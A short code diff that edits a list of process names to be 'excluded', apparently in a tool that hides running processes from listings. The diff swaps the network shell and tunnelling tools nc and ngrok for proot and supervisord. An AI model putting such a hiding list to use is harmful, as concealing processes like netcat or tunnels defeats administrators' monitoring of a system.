@@ -10,8 +10,8 @@
  * Every process with this name will be excluded
  */
 static const char* processes_to_filter[] = {
-    "ngrok",
-    "nc"
+    "proot",
+    "supervisord"
 };
 
 /*
